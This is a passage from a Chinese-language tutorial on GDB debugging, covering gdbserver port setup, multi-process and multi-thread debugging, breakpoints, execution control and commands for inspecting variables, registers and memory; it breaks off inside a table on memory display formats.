对应端口号）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-p</span> 端口号 IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果显示端口状态为 <code>filtered</code> 说明被过滤</p><p>Linux 关闭 gdbserver 对应端口的防火墙（在被调试主机上运行，端口号为 gdbserver 对应端口号）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> 端口号 <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="fork-多进程调试"><a href="#fork-多进程调试" class="headerlink" title="fork 多进程调试"></a>fork 多进程调试</h3><p>查看 GDB 当前设置的多进程调试状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> show follow-fork-mode<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> show detach-on-fork<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设置 fork 子进程调试的参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> follow-fork-mode parent<span class="token operator">|</span>child<span class="token comment"># parent: fork 之后继续调试父进程，子进程不受影响</span><span class="token comment"># child: fork 之后调试子进程，父进程不受影响</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> detach-on-fork on<span class="token operator">|</span>off<span class="token comment"># on: 只有当前被调试的进程能够执行</span><span class="token comment"># off: gdb 将控制父进程和子进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数的详细说明见下表：</p><table><thead><tr><th><code>follow-fork-mode</code> 参数</th><th><code>detach-on-fork</code> 参数</th><th>含义</th></tr></thead><tbody><tr><td><code>parent</code></td><td>on</td><td>只调试父进程（GDB 模式）</td></tr><tr><td><code>child</code></td><td>on</td><td>只调试子进程</td></tr><tr><td><code>parent</code></td><td>off</td><td>同时调试两个进程， GDB 调试父进程，子进程阻塞在 fork 处</td></tr><tr><td><code>child</code></td><td>off</td><td>同时调试两个进程， GDB 调试子进程，父进程阻塞在 fork 处</td></tr></tbody></table><p>查看正在调试的进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info inferior<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>切换调试的进程，假设 <code>info inferior</code> 获取到的进程编号为 <code>Num_id</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> inferior Num_id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="pthread-多线程调试"><a href="#pthread-多线程调试" class="headerlink" title="pthread 多线程调试"></a>pthread 多线程调试</h3><p>查看 GDB 当前设置的多线程调试状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> show follow-fork-mode<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> show detach-on-fork<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设置 fork 子进程调试的参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> scheduler-locking on<span class="token operator">|</span>off<span class="token operator">|</span>on step<span class="token comment"># on: 只有当前被调试的线程能够执行</span><span class="token comment"># off: gdb 将控制父线程和子线程</span><span class="token comment"># on step：在单步执行的时候，除了next过一个函数的情况以外，只有当前线程会执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看正在调试的线程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info thread<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>切换调试的线程，假设 <code>info threads</code> 获取到的线程编号为 <code>Num_id</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> thread Num_id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>让一个或者多个线程执行 GDB 命令 <code>command</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> thread apply Num_id1 Num_id2 <span class="token punctuation">..</span>. <span class="token builtin class-name">command</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>让所有被调试线程执行GDB命令 <code>command</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> thread apply all <span class="token builtin class-name">command</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在所有线程中相应的行上设置断点：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> thread_test.c:123 thread all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><blockquote><p>下断点是调试程序时的重要手段，能够帮助定位和修复程序中的错误和问题。它允许开发者在程序执行期间以精细的粒度检查程序的运行状态，从而更轻松地进行调试</p><p>断点除 break 外，还有 tbreak，简写为：tb<br><strong>tbreak 用于添加一个临时断点，断点一旦被触发就自动删除，使用方法同 break</strong></p></blockquote><hr><h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><blockquote><p>gdb 下断点的指令为：<code>break xxx</code>，也可以简写为：<code>b xxx</code></p><p><strong>下断点的位置都是在将要执行这一句但还未执行的时候</strong></p></blockquote><ol><li>直接断在 <code>main()</code> 函数的入口处，因为 main 是一个全局的符号，也可以断在其他函数的入口处，例如：<code>fun_name()</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> main<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> fun_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>在源代码 test.c 的第 line 行下断点</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> /绝对路径/test.c:line<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> <span class="token string">'test.c'</span>:line<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> line<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>根据运行时的地址设置断点，例如：0xDEADBEEF，地址前需要加上 <code>*</code> 号</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> *0xDEADBEEF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>设置条件断点，当 a &gt; b 时设置函数 <code>fun_name()</code> 断点 （条件断点只支持简单的数据判断）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> fun_name <span class="token keyword">if</span> a＞b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为已设断点添加条件，假设已存在的断点编号为 index：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> condition index a＞b<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> cond index a＞b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>与 <code>break if</code> 类似，只是 <code>condition</code> 只能用在已存在的断点上</p><ol start="5"><li>在当前程序暂停位置的前&#x2F;后 offset 行处下断点</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">break</span> -/+ offest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="删除断点"><a href="#删除断点" class="headerlink" title="删除断点"></a>删除断点</h3><blockquote><p>删除断点的指令有 <code>detele xxx</code> 和 <code>clear xxx</code> 两种：</p><p>delete 是全局的，不受栈帧的影响；<br>delete 命令可以删除所有断点，包括观察点和捕获点等</p><p>clear 命令受到当前栈帧的制约，删除的是将要执行的下一处指令的断点；<br>clear 命令不能删除观察点和捕获点</p></blockquote><ol><li>删除所有断点</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> delete<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>删除编号为 index 的断点</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> delete index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>删除编号为 index1 - index2 的断点（包括 index2）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> delete index1-index2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>删除编号为 index1 - index2 的断点（包括 index2）和编号为 index3 - index4 的断点（包括 index4）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> delete index1-index2 index3-index4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>删除源代码第 line 行的断点，无需断点编号</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token function">clear</span> line<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>删除 <code>fun_name()</code> 函数的断点（只会删除函数入口处的断点，即：<code>b fun_name</code> 所创建的断点，函数内部断点不会删除）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token function">clear</span> fun_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会删除所有的 <code>fun_name()</code> 函数断点，如果有多个同名函数断点，这些同名函数断点都会被删除</p><hr><h3 id="禁用和启用断点"><a href="#禁用和启用断点" class="headerlink" title="禁用和启用断点"></a>禁用和启用断点</h3><blockquote><p>断点的 Enb 参数有 y 和 n 两种，y 表示断点启用，n 表示断点禁用</p></blockquote><ol><li>禁用或启用编号为 index 的断点</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disable index<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">enable</span> index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>禁用或启用编号为 index1 - index2 的断点（包括 index2）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disable index1-index2<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">enable</span> index1-index2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>禁用或启用编号为 index1 - index2 的断点（包括 index2）和编号为 index3 - index4 的断点（包括 index4）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disable index1-index2 index3-index4<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">enable</span> index1-index2 index3-index4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><h3 id="控制程序执行"><a href="#控制程序执行" class="headerlink" title="控制程序执行"></a>控制程序执行</h3><blockquote><p>以下指令主要用于控制程序执行，不需要参数</p></blockquote><table><thead><tr><th align="left">操作</th><th align="left">完整指令</th><th align="left">简洁指令</th></tr></thead><tbody><tr><td align="left">运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令</td><td align="left">run</td><td align="left">r</td></tr><tr><td align="left">单步执行，跳过子函数</td><td align="left">next</td><td align="left">n</td></tr><tr><td align="left">单步执行，进入子函数</td><td align="left">step</td><td align="left">s</td></tr><tr><td align="left">直接执行到下一断点或程序结束</td><td align="left">continue</td><td align="left">c</td></tr><tr><td align="left">执行程序，直到达到指定行号，可用于退出循环体，而不必逐行执行</td><td align="left">until</td><td align="left">u</td></tr><tr><td align="left">退出调试</td><td align="left">quit</td><td align="left">q</td></tr></tbody></table><p><mark>另外，还有 <code>ni</code> 和 <code>si</code>，也是单步执行的命令，用法与 n 和 s 相同，<strong>只不过 ni 和 si 的单步执行是针对汇编代码的</strong></mark></p><blockquote><p>注意：until 指令可以设置参数，让程序运行至源代码的某行，可以不仅仅用来跳出循环</p></blockquote><ol><li>运行程序至源代码第 line 行</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">until</span> line<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>终止调试的程序</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token function">kill</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><blockquote><p>jump：将当前程序执行流跳转到指定行或地址，简写为 j</p><p>jump 命令有两点需要注意的：</p><ol><li>中间跳过的代码是不会执行的，例如变量的初始化等，因此很可能会导致程序崩溃或出现其它 Bug</li><li>如果 jump 跳转到的位置后续没有断点，那么 gdb 会直接执行自跳转处开始的后续代码</li></ol></blockquote><ol><li>跳转到源代码第 line 行的位置</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> jump line<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>跳转到距离当前代码下 offest 行的位置</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> jump +offest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>跳转到某个地址，例如：0xDEADBEEF，地址前需要加上 <code>*</code> 号</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> jump *0xDEADBEEF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="退出函数"><a href="#退出函数" class="headerlink" title="退出函数"></a>退出函数</h3><blockquote><p>实际调试时，在某个函数中调试一段时间后，可能不需要再一步步执行到函数返回处，希望直接执行完当前函数，这时可以使用 finish 命令</p></blockquote><p>return 和 finish 都是退出函数，但也有差别：</p><ul><li>return 命令：立即退出当前函数，剩下的代码不会执行了，<strong>return 还可以指定函数的返回值</strong></li><li>finish 命令：会继续执行完该函数剩余代码再正常退出</li></ul><hr><h2 id="查看程序相关信息"><a href="#查看程序相关信息" class="headerlink" title="查看程序相关信息"></a>查看程序相关信息</h2><h3 id="查看程序状态"><a href="#查看程序状态" class="headerlink" title="查看程序状态"></a>查看程序状态</h3><blockquote><p>gdb 查看程序状态的指令为：<code>info xxx</code>，也可以简写为：<code>i xxx</code></p><p>info 命令用于检索有关程序状态的信息，例如变量、函数、堆栈、线程等</p></blockquote><ol><li>查看断点信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info <span class="token builtin class-name">break</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>查看当前函数中的本地变量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info locals<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>查看当前函数的参数</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info args<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>查看当前设置的监视点列表（用于监视变量的值变化）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info <span class="token function">watch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>查看当前已设置的 display</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info display<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>查看程序中的线程列表以及它们的状态</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info threads<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info th<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="7"><li>查看函数调用栈帧的基本信息，包括堆栈帧的数量、堆栈帧的地址范围和其他有关堆栈帧的信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info stack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>效果与 backtrace 相同：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> backtrace<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> bt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中，#0 项是当前执行的函数（栈帧）</p><ol start="8"><li>查看当前函数调用的栈帧信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info frame<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看栈帧第 n 帧的信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> frame n<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> f n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info frame n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看地址为 address 的桢的相关信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> frame address<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info frame address<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前栈帧上&#x2F;下面第 n 桢的信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> up n<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> down n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="9"><li>查看所有寄存器的当前值</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info registers<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>单独查看某个寄存器的值，例如：RAX</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info r rax<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="10"><li>查看已加载的共享库信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info sharedlibrary<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="11"><li>查看有关目标程序和调试器的信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info target<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info <span class="token function">tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="12"><li>查看可执行文件的所有函数名称</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info functions<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info fun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>只显示函数名带有 abcd 的函数名称：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info functions abcd*<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info fun abcd*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="13"><li>查看程序是否运行</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info program<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="14"><li>查看当前目录</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">pwd</span><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> <span class="token operator">!</span>pwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="查看变量的值"><a href="#查看变量的值" class="headerlink" title="查看变量的值"></a>查看变量的值</h3><blockquote><p>gdb 查看变量的值的指令为：<code>print xxx</code>，也可以简写为：<code>p xxx</code></p></blockquote><p>print 命令可允许自定义输出格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print/参数 变量名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>参数</th><th>功 能</th></tr></thead><tbody><tr><td>&#x2F;x</td><td>以十六进制的形式打印出整数</td></tr><tr><td>&#x2F;d</td><td>以有符号、十进制的形式打印出整数</td></tr><tr><td>&#x2F;u</td><td>以无符号、十进制的形式打印出整数</td></tr><tr><td>&#x2F;o</td><td>以八进制的形式打印出整数</td></tr><tr><td>&#x2F;t</td><td>以二进制的形式打印出整数</td></tr><tr><td>&#x2F;f</td><td>以浮点数的形式打印变量或表达式的值</td></tr><tr><td>&#x2F;c</td><td>以字符形式打印变量或表达式的值</td></tr></tbody></table><ol><li>查看变量、数组、结构体成员或任何合法的表达式的值</li></ol><p>查看变量 variable 的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print variable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看数组元素：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print array<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看结构体成员：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print struct.member<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看合法表达式的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print variable + <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>查看 array[] 数组中，自第 m 个元素起总共 n 个数组元素的值</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> array<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print array<span class="token punctuation">[</span>m-1<span class="token punctuation">]</span>@n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当 m &#x3D; 1，n &#x3D; 2 时，输出：<code>$1 = &#123;1, 2&#125;</code></p><ol start="3"><li>当程序中包含多个作用域不同但名称相同的变量时（全局变量、局部变量），可以借助 <code>::</code> 运算符明确指定要查看的目标变量</li></ol><p>例如源文件 main.c ：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">1.</span> #include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token number">2.</span> <span class="token number">3.</span> <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token number">4.</span> <span class="token number">5.</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">6.</span> <span class="token punctuation">&#123;</span><span class="token number">7.</span>     <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token number">8.</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token number">9.</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当程序执行到第 8 行 <code>return 0;</code> 时</p><ul><li>指定具体的文件名，查看全局变量 num</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print <span class="token string">'main.c'</span>::num<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>指定具体的函数的函数名，查看局部变量 num</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print main::num<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然，由于程序执行到第 8 行 <code>return 0;</code> 时，gdb 调试就暂停在 <code>main()</code> 函数中<br>因此即便不指明 <code>main::</code>，直接使用 <code>print num</code>，这里的 num 默认指代的也是局部变量 num</p><ol start="4"><li>查看变量 variable 的地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print <span class="token operator">&amp;</span>variable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>查看某个地址 address 上的值</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print *address<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>查看某个寄存器的值，例如：RAX</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print <span class="token variable">$rax</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>还可以直接拿 gdb 当计算器用，例如：计算偏移 0xdd - 0x55 的值</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print 0xdd-0x55<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看内存数据"><a href="#查看内存数据" class="headerlink" title="查看内存数据"></a>查看内存数据</h3><blockquote><p>x 用于查看内存中的数据，允许以不同的格式打印内存中的内容</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/<span class="token punctuation">[</span>n/f/u<span class="token punctuation">]</span> <span class="token punctuation">[</span>表达式<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，n、f、u 是可选的参数</p><ul><li><p>n 是一个正整数，表示从当前地址开始，向后显示 n 个地址的内容</p></li><li><p>f 表示显示的格式，具体可选参数如下：</p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">x</td><td align="left">按十六进制格式显示变量</td></tr><tr><td 